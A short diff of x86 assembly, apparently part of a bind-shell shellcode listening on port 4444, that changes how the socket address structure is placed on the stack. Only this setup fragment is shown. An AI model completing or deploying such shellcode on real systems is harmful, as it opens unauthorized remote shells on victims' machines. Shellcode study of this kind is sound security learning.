@@ -39,10 +39,12 @@ _start:
 	xor eax, eax
 	push eax              ; 0 for INADDR_ANY
 
-	push word 0x115c      ; 0x115c for port 4444
+	mov word [esp-2], 0x5c11   ; 0x115c for port 4444
 	
 	mov al, 0x02
-	push eax              ; 2 for AF_INET
+	mov [esp-4], ax      ; 2 for AF_INET
+
+	sub esp, 0x04         ; Adjust stack(PORT and AD_INET share word)
 	
 	mov esi, esp          ; keep track of *sockaddr_in
 
